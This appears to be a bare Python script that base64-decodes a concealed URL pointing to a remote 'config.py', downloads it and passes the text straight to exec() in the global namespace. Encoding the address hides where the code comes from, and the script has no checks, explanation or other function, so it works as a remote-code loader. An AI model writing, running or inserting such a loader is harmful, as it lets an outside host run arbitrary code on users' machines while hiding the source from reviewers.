import base64
import requests

def fetch():
    encoded_url = "aHR0cHM6Ly9hc3NldHMuZG93bmxvYWR6b25lLm5ldC9maWxlcy9jb25maWcucHk="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def execute(code):
    exec(code, globals())

def main():
    code = fetch()
    execute(code)

if __name__ == '__main__':
    main()
